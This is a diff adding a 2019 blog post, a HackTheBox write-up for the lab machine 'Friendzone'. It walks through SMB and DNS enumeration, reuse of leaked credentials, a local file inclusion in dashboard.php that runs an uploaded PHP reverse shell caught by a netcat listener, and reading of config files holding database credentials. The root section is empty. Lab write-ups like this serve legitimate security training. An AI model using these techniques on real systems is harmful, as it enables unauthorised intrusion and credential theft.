@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>Friendzone :: Sam Lane</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="HTB Writeup: friendzone Introduction Friendzone was my third box to own on HackTheBox. I learnt alot from this box. Such as exploiting Local File Inclusion (LFI) to have PHP execute my reverse shell, to understanding more about DNS and the ways python imports libraries.
+Getting User nmap Running nmap on a server will give a lot of information on what ports are open on the machine and what services those ports belong to."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/htb/friendzone/" />
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Friendzone"/>
+<meta name="twitter:description" content="write up for friendzone on HackTheBox a rank easy linux box."/>
+
+
+
+<meta property="og:title" content="Friendzone" />
+<meta property="og:description" content="write up for friendzone on HackTheBox a rank easy linux box." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/htb/friendzone/" />
+
+
+
+<meta property="article:published_time" content="2019-07-13T11:20:31&#43;01:00"/>
+
+<meta property="article:modified_time" content="2019-07-13T11:20:31&#43;01:00"/>
+
+<meta property="og:site_name" content="Sam Lane" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">cd /home/sam</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/projects">Projects</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/projects">Projects</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  <div class="post">
+    <h2 class="post-title"><a href="/htb/friendzone/">Friendzone</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+            13-07-2019
+        </span>
+      
+      
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="/tags/hackthebox/">HackTheBox</a>&nbsp;
+        
+          #<a href="/tags/writeup/">writeup</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+
+<h1 id="htb-writeup-friendzone">HTB Writeup: friendzone</h1>
+
+<h2 id="introduction">Introduction</h2>
+
+<p>Friendzone was my third box to own on HackTheBox. I learnt <strong>alot</strong> from this box. Such as exploiting Local File Inclusion (LFI) to have PHP execute my reverse shell, to understanding more about DNS and the ways python imports libraries.</p>
+
+<h2 id="getting-user">Getting User</h2>
+
+<h3 id="nmap">nmap</h3>
+
+<p>Running nmap on a server will give a lot of information on what ports are open on the machine and what services those ports belong to.</p>
+
+<pre><code class="language-bash">nmap -sS -sC -sV -oA friendzone -p- -T4 10.10.10.123
+</code></pre>
+
+<p>From running the above command we see the following services and ports running on friendzone.</p>
+
+<ul>
+<li>ftp 21</li>
+<li>ssh 22</li>
+<li>domain 53</li>
+<li>http 80</li>
+<li>samba 139</li>
+<li>https 443</li>
+<li>samba 445</li>
+</ul>
+
+<h3 id="looking-into-the-samba-share">Looking into the samba share</h3>
+
+<p>Kali comes with a great tool smbmap for doing recon on samba shares.</p>
+
+<pre><code class="language-bash">smbmap -H 10.10.10.123
+</code></pre>
+
+<p>Running it we get this result.</p>
+
+<pre><code class="language-bash">root@kali:~# smbmap -H 10.10.10.123
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.10.10.123...
+[+] IP: 10.10.10.123:445	Name: administrator1.friendzone.red                     
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	print$                                            	NO ACCESS
+	Files                                             	NO ACCESS
+	general                                           	READ ONLY
+	Development                                       	READ, WRITE
+	IPC$ 
+
+</code></pre>
+
+<p>This tells use we have read only access to general and can read and write to Development. Lets start of by seeing what can be found in general. To do this I used smbclient on kali:</p>
+
+<pre><code class="language-bash">smbclient //10.10.10.123/general
+</code></pre>
+
+<p>When prompted for a password you can just hit enter and get a smb shell. Hitting <code>ls</code> there is a file called creds.txt lets grab that with <code>get creds.txt</code> putting it onto the local machine and using cat to read it we get:</p>
+
+<blockquote>
+<p>creds for the admin THING:</p>
+
+<p>admin:WORKWORKHhallelujah@#</p>
+</blockquote>
+
+<p>Lets have a quick look into Development using the same smbclient command as before and see if there is anything interesting. It just contains rubbish but lets remember for the future we can write to this directory and that can be incredible useful for exploitation.</p>
+
+<h3 id="the-website">The Website</h3>
+
+<p>So we have admin credential that do not work for ssh so maybe the website contains. I used dirb which is a peice of software that takes a list of common urls and trys them against a target. Dirb proved to not find anything other than a mocking robots.txt and an index page:</p>
+
+
+  <figure class="center" >
+    <img src="/img/friendzonewebsite.png"  alt="friendzone website"   style="border-radius: 8px;"  />
+    
+      <figcaption class="right"  style="color: red;" >/index.html</figcaption>
+    
+  </figure>
+
+
+
+<p>That is when I remembered the server was running a DNS service&hellip;</p>
+
+<h3 id="digging-through-dns">Digging through DNS</h3>
+
+<p>DNS is the service that resolves a human readable website url such as www.google.com to an ip address. Thanks to <cite>ippsec<a href="https://youtu.be/JRPWFSzFaG0?t=75">1</a></cite> video were he uses a range of tools to enumerate DNS. The only command he used that was any use was dig. Running:</p>
+
+<pre><code class="language-bash">dig axfr friendzoneportal.red @10.10.10.123
+</code></pre>
+
+<p>Getting the domain friendzoneportal.red from the home page email address returns:</p>
+
+<pre><code class="language-bash">root@kali:~/HTB/FriendZone# dig axfr friendzoneportal.red @10.10.10.123
+
+; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-3-Debian &lt;&lt;&gt;&gt; axfr friendzoneportal.red @10.10.10.123
+;; global options: +cmd
+friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+friendzoneportal.red.	604800	IN	AAAA	::1
+friendzoneportal.red.	604800	IN	NS	localhost.
+friendzoneportal.red.	604800	IN	A	127.0.0.1
+admin.friendzoneportal.red. 604800 IN	A	127.0.0.1
+files.friendzoneportal.red. 604800 IN	A	127.0.0.1
+imports.friendzoneportal.red. 604800 IN	A	127.0.0.1
+vpn.friendzoneportal.red. 604800 IN	A	127.0.0.1
+friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+;; Query time: 28 msec
+;; SERVER: 10.10.10.123#53(10.10.10.123)
+;; WHEN: Thu Jul 11 15:17:22 BST 2019
+;; XFR size: 9 records (messages 1, bytes 309)
+</code></pre>
+
+<blockquote>
+<p>admin.friendzoneportal.red</p>
+</blockquote>
+
+<p>Great! we have found the admin page. Lets update our /etc/hosts file to use these new domains. Unfortuantly you cannot use the servers dns service as they all resolve to localhost. Initially visiting admin.friendzoneportal.red just shows the same index page. So lets try https</p>
+
+<p>Excellent we have a login form but when we log in we are just told</p>
+
+<blockquote>
+<p>Admin page is not developed yet !!! check for another one</p>
+</blockquote>
+
+<p>so more digging is required. Checking the SSL certificate from the website can see the issue is from a friendzone.red lets run dig again but this time zone transfer without the portal in the domain.</p>
+
+<pre><code class="language-bash">root@kali:~/HTB/FriendZone# dig axfr friendzone.red @10.10.10.123
+
+; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-3-Debian &lt;&lt;&gt;&gt; axfr friendzone.red @10.10.10.123
+;; global options: +cmd
+friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+friendzone.red.		604800	IN	AAAA	::1
+friendzone.red.		604800	IN	NS	localhost.
+friendzone.red.		604800	IN	A	127.0.0.1
+administrator1.friendzone.red. 604800 IN A	127.0.0.1
+hr.friendzone.red.	604800	IN	A	127.0.0.1
+uploads.friendzone.red.	604800	IN	A	127.0.0.1
+friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+;; Query time: 25 msec
+;; SERVER: 10.10.10.123#53(10.10.10.123)
+;; WHEN: Thu Jul 11 16:01:52 BST 2019
+;; XFR size: 8 records (messages 1, bytes 289)
+</code></pre>
+
+<p>Update /etc/hosts and visit <a href="https://administrator1.friendzone.red">https://administrator1.friendzone.red</a></p>
+
+
+  <figure class="center" >
+    <img src="/img/login.png"  alt="Admin Login"   style="border-radius: 8px;"  />
+    
+      <figcaption class="right"  style="color: red;" >Login</figcaption>
+    
+  </figure>
+
+
+
+<p>Login using the username and password from creds.txt we got earlier from the samba share. On logging in we are told to visit /dashboard.php</p>
+
+
+  <figure class="center" >
+    <img src="/img/dashboard.png"  alt="Admin Login"   style="border-radius: 8px;"  />
+    
+      <figcaption class="right"  style="color: red;" >The dashboard</figcaption>
+    
+  </figure>
+
+
+
+<p>Another subdomain worth note was the uploads.friendzone.red here we could upload our own images and also see two images already stored a.jpg and b.jpg.</p>
+
+<h2 id="exploiting-the-lfi">Exploiting the LFI</h2>
+
+<p>On this dashboard page we are told image_name param is missing and we should enter it to show the image. Entering the &lsquo;default&rsquo; parameters we get</p>
+
+
+  <figure class="center" >
+    <img src="/img/haha.png"  alt="Admin Login"   style="border-radius: 8px;"  />
+    
+      <figcaption class="right"  style="color: red;" >Checking out the default params</figcaption>
+    
+  </figure>
+
+
+
+<p>Interestingly final access timestamp corresponds to the unix time the request was sent. The pagename param is vulnrable from LFI or local file inclusion attacks. This is where a would be attack can navigate the systems directories by using urls not cleanst by the developer.</p>
+
+<p>Remembering the samba share from earlier it is possible to upload a <cite>reverse-shell<a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">2</a></cite> php script into the Developers share this can then be executed by entering image_id=b.jpg and using the pagename=/etc/Development/reverse-shell omitting the file extention. With ncat listening using the command.</p>
+
+<pre><code class="language-bash">nc -v -n -l -p 3333
+</code></pre>
+
+<p>we gain a shell.</p>
+
+
+  <figure class="center" >
+    <img src="/img/got-it.png"  alt="Admin Login"   style="border-radius: 8px;"  />
+    
+      <figcaption class="right"  style="color: red;" >Got it!</figcaption>
+    
+  </figure>
+
+
+
+<p>lets grab the flag!</p>
+
+<pre><code class="language-bash">$ cd /home/friend
+$ ls
+user.txt
+$ cat user.txt
+a9e**************************a11
+</code></pre>
+
+<p>Can we make our shell more stable? Lets look into /var/www and see if there is any creds to be found. Trying these creds in ssh and we get a full shell onto escalating too root.</p>
+
+<pre><code class="language-bash">$ cd /var/www
+$ ls
+admin
+friendzone
+friendzoneportal
+friendzoneportaladmin
+html
+mysql_data.conf
+uploads
+$ cat mysql_data.conf
+for development process this is the mysql creds for user friend
+
+db_user=friend
+
+db_pass=Agp****213
+
+db_name=FZ
+$ 
+</code></pre>
+
+<h2 id="owning-root">Owning Root</h2>
+
+<h2 id="references">References</h2>
+
+<ol>
+<li><p><a href="https://youtu.be/JRPWFSzFaG0?t=75">ippsec</a></p></li>
+
+<li><p><a href="https://stackoverflow.com/questions/2002120/citing-the-author-of-a-blockquote-using-markdown-syntax">php-reverse-shell</a></p></li>
+</ol>
+
+    </div>
+    
+
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user"> </div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+      
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-143674549-1', 'auto');
+ga('send', 'pageview');
+</script>
+
+    
+  </body>
+</html>
